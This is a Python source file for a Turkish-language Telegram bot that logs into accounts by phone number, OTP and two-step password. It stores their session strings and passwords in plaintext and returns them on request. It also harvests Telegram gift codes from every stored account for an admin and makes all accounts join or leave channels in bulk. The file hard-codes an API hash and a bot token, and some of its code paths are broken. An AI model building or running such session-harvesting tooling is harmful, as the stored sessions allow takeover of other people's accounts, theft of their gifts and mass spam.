import zipfile
import os
try:
    from telethon.sessions import StringSession
    import asyncio, re, json, shutil
    from kvsqlite.sync import Client as uu
    from telethon.tl.types import KeyboardButtonUrl
    from telethon.tl.types import KeyboardButton, ReplyInlineMarkup
    from telethon import TelegramClient, events, functions, types, Button
    from telethon.tl.types import DocumentAttributeFilename
    from plugins.converter import MangSession
    import time, datetime, random 
    from datetime import timedelta
    from telethon.errors import (
        ApiIdInvalidError,
        PhoneNumberInvalidError,
        PhoneCodeInvalidError,
        PhoneCodeExpiredError,
        SessionPasswordNeededError,
        PasswordHashInvalidError
    )
    from plugins import *
    from plugins.messages import *
    from plugins.get_gift import *
except:
    os.system("pip install telethon kvsqlite")
    try:
        from telethon.sessions import StringSession
        import asyncio, re, json, shutil
        from kvsqlite.sync import Client as uu
        from telethon.tl.types import KeyboardButtonUrl
        from telethon.tl.types import KeyboardButton
        from telethon import TelegramClient, events, functions, types, Button
        from telethon.tl.types import DocumentAttributeFilename
        from plugins.converter import MangSession
        import time, datetime, random 
        from datetime import timedelta
        from telethon.errors import (
            ApiIdInvalidError,
            PhoneNumberInvalidError,
            PhoneCodeInvalidError,
            PhoneCodeExpiredError,
            SessionPasswordNeededError,
            PasswordHashInvalidError
        )
        from plugins import *
        from plugins.messages import *
        from plugins.get_gift import *
    except Exception as errors:
        print('Bir Hata Oluştu: ' + str(errors))
        
        exit(0)

        
if not os.path.isdir('veritabani'):
    os.mkdir('veritabani')

API_ID = "21871272"
API_HASH = "57efa4949cd41dccd628c04b8507ff2b"
admin ='12563655354'

# Botunuzun tokeni ile değiştirin
token = "6776395463:AAH2z5apFePZmHlllaePmlttntf4EhExWqg"
client = TelegramClient('ses', API_ID, API_HASH)
client.start()
bot = client

# Veritabanını oluştur
db = uu('veritabani/elhakem.ss', 'bot')

if not db.exists("hesaplar"):
    db.set("hesaplar", [])

if not db.exists("kotu_adamlar"):
    db.set("kotu_adamlar", [])

if not db.exists("zorla"):
   db.set("zorla", [])
      
@client.on(events.NewMessage(pattern="/start", func = lambda x: x.is_private))
async def start(event):
    user_id = event.chat_id
    bans = db.get('kotu_adamlar') if db.exists('kotu_adamlar') else []
    async with bot.conversation(event.chat_id) as x:
        buttons = [
            [
                Button.inline("Hesap Ekle", data="ekle"),
                Button.inline("Hediyeleri Al", data="hediye_al"),
            ],
            [
                Button.inline("Kanala Katıl", data="kanala_katil"),
                Button.inline("Kanaldan Ayrıl", data="kanaldan_ayril"),
            ],
            [
                Button.inline("Pyrogram Oturumu Kaydet", data="pyrogram"),
                Button.inline("Telethon Oturumu Kaydet", data="telethon"),
            ],
            [
                Button.inline("Yedek Al", data="zip_tum"),
                Button.inline("Oturum Al", data="oturum_al"),
            ],
            [
                Button.inline("Bot Hesap Sayısı", data="hesap_sayisi"),
            ],
            [
                Button.inline("Hesapları Temizle", data="kontrol_et"),
                Button.inline("Kanallardan Ayrıl", data="tumunu_ayril"),
            ],
        ]
        await event.reply("**- Hesaplarınızdan Özel Bağlantıları Çeken Bot'a Hoş Geldiniz 🔗**\n\n- Aşağıdaki düğmelerden yapmak istediğiniz işlemi seçin.", buttons=buttons)
        
        
        
@client.on(events.callbackquery.CallbackQuery())
async def start_lis(event):
    data = event.data.decode('utf-8')
    user_id = event.chat_id
    if data == "pyrogram":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Lütfen Pyrogram oturumunuzu gönderin.")
            txt = await x.get_response()
            session = txt.text
            try:
                Convert_sess = MangSession.PYROGRAM_TO_TELETHON(session)
            except:
                return await x.send_message("- Lütfen doğru bir Pyrogram oturumu gönderin.")
            data = {"telefon_numarası": "Belirlenemedi", "iki_adim": "Yok", "oturum": Convert_sess}
            acc = db.get("hesaplar")
            acc.append(data)
            db.set("hesaplar", acc)
            with open('oturum.txt', 'w') as file:
                file.write(str(session) + '\n')
            await x.send_message("- Oturum başarıyla kaydedildi ✅")
    
    if data == "telethon":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Lütfen Telethon oturumunuzu gönderin.")
            txt = await x.get_response()
            session = txt.text
            data = {"telefon_numarası": "Belirlenemedi", "iki_adim": "Yok", "oturum": Convert_sess}
            acc = db.get("hesaplar")
            acc.append(data)
            db.set("hesaplar", acc)
            with open('oturum.txt', 'w') as file:
                file.write(str(session) + '\n')
            await x.send_message("- Oturum başarıyla kaydedildi ✅")
            
    if data == "geri" or data == "iptal":
        buttons = [
            [
                Button.inline("Hesap Ekle", data="ekle"),
                Button.inline("Hediyeleri Al", data="hediye_al"),
            ],
            [
                Button.inline("Kanala Katıl", data="kanala_katil"),
                Button.inline("Kanaldan Ayrıl", data="kanaldan_ayril"),
            ],
            [
                Button.inline("Pyrogram Oturumu Kaydet", data="pyrogram"),
                Button.inline("Telethon Oturumu Kaydet", data="telethon"),
            ],
            [
                Button.inline("Yedek Al", data="zip_tum"),
                Button.inline("Oturum Al", data="oturum_al"),
            ],
            [
                Button.inline("Bot Hesap Sayısı", data="hesap_sayisi"),
            ],
            [
                Button.inline("Hesapları Temizle", data="kontrol_et"),
                Button.inline("Kanallardan Ayrıl", data="tumunu_ayril"),
            ],
        ]
        await event.edit("**- Hesaplarınızdan Özel Bağlantıları Çeken Bot'a Hoş Geldiniz 🔗**\n\n- Aşağıdaki düğmelerden yapmak istediğiniz işlemi seçin.", buttons=buttons)
    if data == "ekle":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("✔️ Lütfen telefon numaranızı ve ülke kodunuzu gönderin, örneğin: +201000000000")
            txt = await x.get_response()
            phone_number = txt.text.replace("+", "").replace(" ", "")
            app = TelegramClient(StringSession(), API_ID, API_HASH)
            await app.connect()
            password=None
            try:
                code = await app.send_code_request(phone_number)
            except (ApiIdInvalidError):
                await x.send_message("Botunuzun **API_ID** ve **API_HASH** kombinasyonu Telegram sistemi ile eşleşmiyor.")
                return
            except (PhoneNumberInvalidError):
                await x.send_message("Gönderdiğiniz **telefon numarası**, herhangi bir Telegram hesabına ait değil.")
                return
            await x.send_message("- Doğrulama kodunuz hesabınıza gönderildi.\n\n- Lütfen aşağıdaki formatta kodu gönderin: 1 2 3 4 5")
            txt = await x.get_response()
            code = txt.text.replace(" ", "")
            try:
                await app.sign_in(phone_number, code, password=None)
                string_session = app.session.save()
                data = {"telefon_numarası": phone_number, "iki_adim": "Yok", "oturum": string_session}
                hesaplar = db.get("hesaplar")
                hesaplar.append(data)
                db.set("hesaplar", hesaplar)
                await x.send_message("- Hesap başarıyla kaydedildi ✅")
            except (PhoneCodeInvalidError):
                await x.send_message("**Gönderdiğiniz OTP yanlış.**")
                return
            except (PhoneCodeExpiredError):
                await x.send_message("**Gönderdiğiniz OTP süresi doldu.**")
                return
            except (SessionPasswordNeededError):
                await x.send_message("- Lütfen iki adımlı doğrulama şifrenizi gönderin")
                txt = await x.get_response()
                password = txt.text
                try:
                    await app.sign_in(password=password)
                except (PasswordHashInvalidError):
                    await x.send_message("**Gönderdiğiniz parola yanlış.**")
                    return
                string_session = app.session.save()
                data = {"telefon_numarası": phone_number, "iki_adim": password, "oturum": string_session}
                hesaplar = db.get("hesaplar")
                hesaplar.append(data)
                db.set("hesaplar", hesaplar)
                await x.send_message("- Hesap başarıyla kaydedildi ✅")
    if data == "hesap_sayisi":
        acc = db.get("hesaplar")
        await event.answer(f"- Bot hesap sayısı: {len(acc)}", alert=True)
    if data == "hediye_al":
        await event.answer(f"- Hesaplardan hediyeler alınmaya başlandı, lütfen bildirim bekleyin", alert=True)
        acc = db.get("hesaplar")
        count = 0
        for i in acc:
            x = await get_gift(i["oturum"])
            if x != False:
                text = f"**• Yeni Telegram hediye bağlantısı 🥳**\n\n- Bağlantı: https://t.me/giftcode/{x}\n- Telefon numarası: `{i['telefon_numarası']}`"
                count += 1
                await client.send_message(admin, text)
        await client.send_message(admin, f"- Hesaplar tarandı, {count} bağlantı bulundu")
    if data == "kanala_katil":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Lütfen tüm hesaplarla katılmak istediğiniz kanalın bağlantısını veya kullanıcı adını gönderin.")
            ch = await x.get_response()
            if "@" not in ch.text:
                if "/t.me/" not in ch.text:
                    await x.send_message(f"- Lütfen doğru bir bağlantı veya kullanıcı adı gönderin.")
                    return 
            channel = ch.text.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
            acc = db.get("hesaplar")
            true, false = 0, 0
            await x.send_message(f"- {len(acc)} hesapla katılmaya başlandı")
            for i in acc:
                xx = await join_channel(i["oturum"], channel)
                if xx is True:
                    true += 1
                else:
                    false += 1
            await x.send_message(f"**- İsteğiniz başarıyla tamamlandı ✅**\n\n- Başarılı: {true}\n- Başarısız: {false}")
    if data == "kanaldan_ayril":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Lütfen tüm hesaplarla ayrılmak istediğiniz kanalın bağlantısını veya kullanıcı adını gönderin.")
            ch = await x.get_response()
            if "@" not in ch.text:
                if "/t.me/" not in ch.text:
                    await x.send_message(f"- Lütfen doğru bir bağlantı veya kullanıcı adı gönderin.")
                    return 
            channel = ch.text.replace("https://t.me/", "").replace("http://t.me/", "").replace("@", "")
            acc = db.get("hesaplar")
            true, false = 0, 0
            await x.send_message(f"- {len(acc)} hesapla ayrılmaya başlandı")
            for i in acc:
                xx = await leave_channel(i["oturum"], channel)
                if xx is True:
                    true += 1
                else:
                    false += 1
            await x.send_message(f"**- İsteğiniz başarıyla tamamlandı ✅**\n\n- Başarılı: {true}\n- Başarısız: {false}")
    if data == 'zip_tum':
        folder_path = f"./database"
        zip_file_name = f"database.zip"
        zip_file_nam = f"database"
        try:
            shutil.make_archive(zip_file_nam, 'zip', folder_path)
            with open(zip_file_name, 'rb') as zip_file:
                await client.send_file(user_id, zip_file, attributes=[DocumentAttributeFilename(file_name="database.zip")])
            os.remove(zip_file_name)
        except Exception as a:
            print(a)
    if data == "tumunu_ayril":
        buttons = [
            [
                Button.inline("Evet ✅", data="tumunu_ayril_channels"),
                Button.inline("İptal ❌", data="cancel"),
            ]
        ]
        await event.edit("**- Tüm hesaplarından kanallardan ayrılmak istediğinizden emin misiniz?**", buttons=buttons)
    if data == "tumunu_ayril_channels":
        async with bot.conversation(event.chat_id) as x:
            acc = db.get("hesaplar")
            await event.edit(f"**- {len(acc)} hesapla kanallardan ayrılmaya başlandı, tamamlanınca bildirim alacaksınız **")
            true, false = 0, 0
            await x.send_message(f"- {len(acc)} hesapla ayrılmaya başlandı")
            for i in acc:
                xx = await leave_all(i["oturum"])
                if xx is True:
                    true += 1
                else:
                    false += 1
            await x.send_message(f"**- İsteğiniz başarıyla tamamlandı ✅**\n\n- Başarılı: {true}\n- Başarısız: {false}")
    
    if data == "kontrol_et":
        buttons = [
            [
                Button.inline("Evet ✅", data="hesap_kontrol"),
                Button.inline("İptal ❌", data="cancel"),
            ]
        ]
        await event.edit("**- Tüm hesaplarınızı kontrol etmek istediğinizden emin misiniz?**", buttons=buttons)
    if data == "hesap_kontrol":
        async with bot.conversation(event.chat_id) as x:
            acc = db.get("hesaplar")
            await event.edit(f"**- {len(acc)} hesapla kontrol işlemi başlatıldı, tamamlanınca bildirim alacaksınız **")
            true, false = 0, 0
            await x.send_message(f"- {len(acc)} hesapla kontrol ediliyor")
            for i in acc:
                Convert_sess = MangSession.TELETHON_TO_PYROGRAM(i["oturum"])
                xx = await check(Convert_sess, client, user_id)
                if xx is True:
                    true += 1
                else:
                    false += 1
                    acc.remove(i)
                    db.set("hesaplar", acc)
                await event.edit(f"**- Hesaplar kontrol ediliyor 📂**\n\n- Aktif Hesaplar: {true}\n- Silinen Hesaplar: {false}")
                
            await x.send_message(f"**- Hesaplar başarıyla kontrol edildi ✅**\n\n- Aktif Hesaplar: {true}\n- Silinen Hesaplar: {false}")
    if data == "oturum_al":
        async with bot.conversation(event.chat_id) as x:
            await x.send_message("- Lütfen botun kaydedildiği telefon numarasını gönderin")
            txt = await x.get_response()
            phone_number = txt.text.replace("+", "").replace(" ", "")
            acc = db.get("hesaplar")
            for i in acc:
                if phone_number == i['telefon_numarası']:
                    text = f"• Telefon Numarası: {phone_number}\n\n- İki Adımlı Doğrulama: {i['iki_adim']}\n\n- Oturum: `{i['oturum']}"
                    await x.send_message(text)
                    return
            await x.send_message("- Bu numara hesaplar listesinde bulunamadı")
            
@client.on(events.NewMessage())
async def handle_zip_file(event):
    async with bot.conversation(event.chat_id) as x:
        try:
            if event.media and event.media.document:
                message = event.message
                file = await message.download_media()

                if not os.path.exists('olddata'):
                    os.makedirs('olddata')

                with zipfile.ZipFile(file, 'r') as zip_ref:
                    zip_ref.extractall('olddata')
                    
                os.remove(file)
                await x.send_message('Dosya başarıyla çıkarıldı ve "olddata" klasörüne yerleştirildi.')
                olddb = uu('olddata/data.sqlite', 'fuck')
                accs = db.get("hesaplar")
                if olddb.exists("sessions") and len(olddb.get("sessions")) > 0:
                    for i in olddb.get("sessions"):
                        Convert_sess = MangSession.PYROGRAM_TO_TELETHON(i)
                        data = {"telefon_numarası": "Tanınmadı", "iki_adim": "Yok", "oturum": Convert_sess}
                        if data not in accs:
                            accs.append(data)
                            db.set("hesaplar", accs)
                    await x.send_message(f'{len(olddb.get("sessions"))} hesap başarıyla eklenmiştir.')
                else: 
                    await x.send_message(f'• Bu yedek herhangi bir numara içermiyor')
        except Exception as e:
            await x.send_message(f'Çıkarırken bir sorun oluştu: {str(e)}')
        
client.run_until_disconnected()
